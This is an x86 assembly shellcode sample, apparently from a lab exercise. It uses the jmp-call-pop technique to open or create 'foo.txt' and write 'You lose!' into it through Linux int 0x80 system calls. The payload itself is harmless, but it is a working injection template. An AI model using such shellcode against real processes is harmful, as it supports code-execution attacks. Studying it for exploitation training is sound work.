.global shellcode

shellcode:
    jmp ender

starter:
    pop %ebx

    mov $0x124, %edx
    mov $0x42, %ecx
    mov $0x5, %eax
    int $0x80

    mov $0x9, %edx
    add $0x8, %bl
    mov %ebx, %ecx
    mov %eax, %ebx
    mov $0x4, %eax
    int $0x80

    ret

ender:
    call starter
    .string "foo.txt"
    .string "You lose!"
